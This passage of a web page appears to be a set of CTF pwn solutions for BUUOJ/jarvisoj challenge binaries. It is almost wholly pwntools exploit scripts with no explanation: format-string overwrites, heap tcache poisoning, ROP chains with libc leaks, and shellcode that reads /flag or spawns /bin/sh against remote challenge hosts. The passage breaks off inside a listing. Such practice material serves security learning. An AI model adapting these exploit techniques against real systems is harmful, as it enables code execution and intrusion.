class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from printf_buf_not_in_stack import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("login")</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    sh = null</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./login")</span><br><span class="line">        lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("libc-2.27.so")</span><br><span class="line">    sh.sendlineafter(":","a")</span><br><span class="line">    payload = '%6$pAA%15$pBB\x00'</span><br><span class="line">    sh.sendlineafter(":",payload)</span><br><span class="line">    sh.recvuntil("0x")</span><br><span class="line">    ebp = int(sh.recvuntil("AA",True),16)</span><br><span class="line">    target_addr = ebp - (0xffe54918 - 0xffe5490c)</span><br><span class="line">    libc = int(sh.recvuntil("BB",True),16) - lib.symbols['__libc_start_main'] - 241</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line">    binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">    def inputMsg(msg):</span><br><span class="line">        sh.sendlineafter("!",msg)</span><br><span class="line">    ebp1_offset = 6</span><br><span class="line">    ebp2_offset = 10</span><br><span class="line">    written_size = 0</span><br><span class="line">    offset = 0</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = 0x8d29</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 2</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = 0x804</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 16</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = system % 0x10000</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 18</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = system >> 16</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 20</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = 0xbeef</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 22</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = 0xdead</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 24</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = binsh % 0x10000</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    offset = 26</span><br><span class="line">    position = (target_addr + offset) % 0x10000</span><br><span class="line">    payload = "%" + str(position - written_size) + "c%" + str(ebp1_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    oneByte = binsh >> 16</span><br><span class="line">    payload = "%" + str(oneByte - written_size) + "c%" + str(ebp2_offset) + "$hn\x00"</span><br><span class="line">    inputMsg(payload)</span><br><span class="line">    inputMsg("wllmmllw")</span><br><span class="line">    print getCode("inputMsg")</span><br><span class="line">    log.success("ebp: " + hex(ebp))</span><br><span class="line">    log.success("target_addr: " + hex(target_addr))</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("binsh: " + hex(binsh))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node3.buuoj.cn",28300,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x75-SWPUCTF-2019-p1KkHeap"><a href="#0x75-SWPUCTF-2019-p1KkHeap" class="headerlink" title="0x75 SWPUCTF_2019_p1KkHeap"></a>0x75 SWPUCTF_2019_p1KkHeap</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def add(size):</span><br><span class="line">    sh.sendlineafter(":","1")</span><br><span class="line">    sh.sendlineafter(":",str(size))</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sh.sendlineafter(":","3")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">    sh.sendafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendlineafter(":","4")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter(":","2")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def backdoor(content):</span><br><span class="line">    sh.sendlineafter(":","666")</span><br><span class="line">    sh.sendlineafter("(y or n)","y")</span><br><span class="line">    sh.sendafter("start",content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./pwn")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("libc.so.6")</span><br><span class="line">    add(0x90)</span><br><span class="line">    free(0)</span><br><span class="line">    free(0)</span><br><span class="line">    show(0)</span><br><span class="line">    sh.recvuntil("content: ")</span><br><span class="line">    heap_base = u64(sh.recvuntil("\n",True).ljust(8,"\x00")) - 0x260</span><br><span class="line">    add(0x90)</span><br><span class="line">    edit(1,p64(heap_base + 0x10))</span><br><span class="line">    add(0x90)</span><br><span class="line">    add(0x90)</span><br><span class="line">    payload = p64(0) + p64(0xffffffffffffffff) * 7 + p64(0) + p64(0x201) + p64(0) * 6 + p64(heap_base + 0x60)</span><br><span class="line">    edit(3,payload)</span><br><span class="line">    add(0x90)</span><br><span class="line">    free(4)</span><br><span class="line">    show(4)</span><br><span class="line">    sh.recvuntil("content: ")</span><br><span class="line">    libc = u64(sh.recvuntil("\x7f",False).ljust(8,'\x00')) - 96 - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">    __malloc_hook = libc + lib.symbols['__malloc_hook']</span><br><span class="line">    payload = p64(0) + p64(0xffffffffffffffff) * 7 + p64(0) + p64(0x201) + p64(0) * 6 + p64(0x66660000) + p64(__malloc_hook)</span><br><span class="line">    edit(3,payload)</span><br><span class="line">    add(0x90)</span><br><span class="line">    payload = shellcraft.open("/flag")</span><br><span class="line">    payload += shellcraft.read(3,0x66660100,0x30)</span><br><span class="line">    payload += shellcraft.write(1,0x66660100,0x30)</span><br><span class="line">    edit(5,asm(payload))</span><br><span class="line">    add(0xa0)</span><br><span class="line">    edit(6,p64(0x66660000))</span><br><span class="line">    add(0x90)</span><br><span class="line">    log.success("heap_base: " + hex(heap_base))</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        log.success("pid: " + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node3.buuoj.cn",26426,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x76-axb-2019-final-blindHeap"><a href="#0x76-axb-2019-final-blindHeap" class="headerlink" title="0x76 axb_2019_final_blindHeap"></a>0x76 axb_2019_final_blindHeap</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">sh = remote("node3.buuoj.cn",26738)</span><br><span class="line">def add(des_size,des,name_size,name):</span><br><span class="line">    sh.sendlineafter("Your choice:","1")</span><br><span class="line">    sh.sendlineafter("please tell me the desrcription's size",str(name_size))</span><br><span class="line">    sh.sendlineafter("please tell me the desrcript of commodity.",str(name))</span><br><span class="line">    sh.sendlineafter("please tell me the commodity-name's size.",str(des_size))</span><br><span class="line">    sh.sendlineafter("please tell me the commodity-name.",str(des))</span><br><span class="line">def inputName(content):</span><br><span class="line">    sh.sendlineafter("your name?",content)</span><br><span class="line">def modifyName(content):</span><br><span class="line">    sh.sendlineafter("Your choice:","6")</span><br><span class="line">    sh.sendlineafter("Change your name(1~32):",content)</span><br><span class="line">def free():</span><br><span class="line">    sh.sendlineafter("Your choice:","4")</span><br><span class="line">def edit(idx,name,des):</span><br><span class="line">    sh.sendlineafter("choice:","2")</span><br><span class="line">    sh.sendlineafter("index is",str(idx))</span><br><span class="line">    sh.sendlineafter("name",name)</span><br><span class="line">    sh.sendlineafter("desrc",des)</span><br><span class="line">def empty(idx):</span><br><span class="line">    sh.sendlineafter("choice:","5")</span><br><span class="line">    sh.sendlineafter("just one","2")</span><br><span class="line">    sh.sendlineafter("index is",str(idx))</span><br><span class="line">def showall():</span><br><span class="line">    sh.sendlineafter("choice:","3")</span><br><span class="line">    sh.sendlineafter("all","1")</span><br><span class="line">inputName("b" *32)</span><br><span class="line">add(0x80,'\x11', 0x80,'\x12' * 0x80)</span><br><span class="line">sh.sendlineafter("Your choice:","6")</span><br><span class="line">sh.recvuntil("b" * 32)</span><br><span class="line">heap_base = (u64(sh.recvuntil("\x2e\n",True).ljust(8,'\x00')) >> 12) << 12</span><br><span class="line">log.success("heap_base: " + hex(heap_base))</span><br><span class="line">sh.sendline("a" * 31)</span><br><span class="line">free()</span><br><span class="line">payload = 'a' * 96</span><br><span class="line">payload += p64(0x600)</span><br><span class="line">payload += p64(heap_base + 0x130 + 0x100 - 0x18 + 0x8 + 0x8)</span><br><span class="line">payload += p64(0x800)</span><br><span class="line">payload += p64(heap_base + 0x10)</span><br><span class="line">add(0x80,'\x13', 0x80,payload)</span><br><span class="line">add(0x80,'\x14', 0x80,'\x15' * 0x80)</span><br><span class="line">add(0x80,'\x16', 0x80,'\x17' * 0x80)</span><br><span class="line">modifyName('a' * 32)</span><br><span class="line">empty(1)</span><br><span class="line">showall()</span><br><span class="line">main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">__malloc_hook =main_arena - 88 - 0x10</span><br><span class="line">libc = __malloc_hook - lib.symbols['__malloc_hook']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">log.success("__free_hook: ")</span><br><span class="line">payload = 'a' * 280 + p64(0x666) + p64(__free_hook) + p64(0x100) + p64(heap_base + 0x10)</span><br><span class="line">edit(0,payload,'b')</span><br><span class="line">edit(1,p64(system),'/bin/sh\x00')</span><br><span class="line">empty(0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x77-axb-2019-brop64"><a href="#0x77-axb-2019-brop64" class="headerlink" title="0x77 axb_2019_brop64"></a>0x77 axb_2019_brop64</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("axb_2019_brop64")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global lib</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./axb_2019_brop64")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line">pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line">offset = 216</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(elf.got['__libc_start_main'])</span><br><span class="line">payload += p64(elf.plt['puts'])</span><br><span class="line">payload += p64(0x4007D6)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(0xdeadbeef)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",29654,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x78-jarvisoj-tell-me-something"><a href="#0x78-jarvisoj-tell-me-something" class="headerlink" title="0x78 jarvisoj_tell_me_something"></a>0x78 jarvisoj_tell_me_something</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process("./guestbook")</span><br><span class="line">sh = remote("node3.buuoj.cn",25564)</span><br><span class="line">junk = 'a' * 0x88</span><br><span class="line">shell_address = 0x0000000000400620</span><br><span class="line">payload = junk + p64(shell_address)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("message:\n")</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x79-jarvisoj-level3-x64"><a href="#0x79-jarvisoj-level3-x64" class="headerlink" title="0x79 jarvisoj_level3_x64"></a>0x79 jarvisoj_level3_x64</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh=remote("node3.buuoj.cn",25389)</span><br><span class="line">#sh = process ('./level3_x64')</span><br><span class="line">elf = ELF("level3_x64")</span><br><span class="line">libc = ELF("libc-2.23 .so")</span><br><span class="line">write_addr = elf.symbols['write']</span><br><span class="line">read_addr = elf.symbols['read']</span><br><span class="line">start_addr = elf.symbols['_start']</span><br><span class="line">__libc_start_main_addr = elf.got['__libc_start_main']</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line">payload =  'a' * 136</span><br><span class="line">payload +=   p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret)  + p64(__libc_start_main_addr) + p64(1)  + p64(write_addr)</span><br><span class="line">payload += p64(0x00000000004005E6)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00')) </span><br><span class="line">libc_base = __libc_start_main - libc.symbols['__libc_start_main']</span><br><span class="line">ret_text = u64(sh.recv(8))</span><br><span class="line">system_addr = libc_base + libc.symbols['system']</span><br><span class="line">shell_addr = libc_base + next(libc.search('/bin/sh\0'))</span><br><span class="line">payload = 'a'*136 + p64(pop_rdi_ret) + p64(shell_addr) + p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x80-jarvisoj-level0"><a href="#0x80-jarvisoj-level0" class="headerlink" title="0x80 jarvisoj_level0"></a>0x80 jarvisoj_level0</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process("./level0")</span><br><span class="line">sh = remote("node3.buuoj.cn",29420)</span><br><span class="line">offset = 136</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(0x0000000000400596)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x81-jarvisoj-level1"><a href="#0x81-jarvisoj-level1" class="headerlink" title="0x81 jarvisoj_level1"></a>0x81 jarvisoj_level1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("level1")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global lib</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./level1")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">pop_ebx_ret = elf.search(asm("pop ebx\nret")).next()</span><br><span class="line">pop3_ret = elf.search(asm("pop esi\npop edi\npop ebp\nret")).next()</span><br><span class="line">offset = 140</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p32(elf.plt['read'])</span><br><span class="line">payload += p32(pop3_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">payload += p32(0x300)</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",27154,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x82-jarvisoj-level2"><a href="#0x82-jarvisoj-level2" class="headerlink" title="0x82 jarvisoj_level2"></a>0x82 jarvisoj_level2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 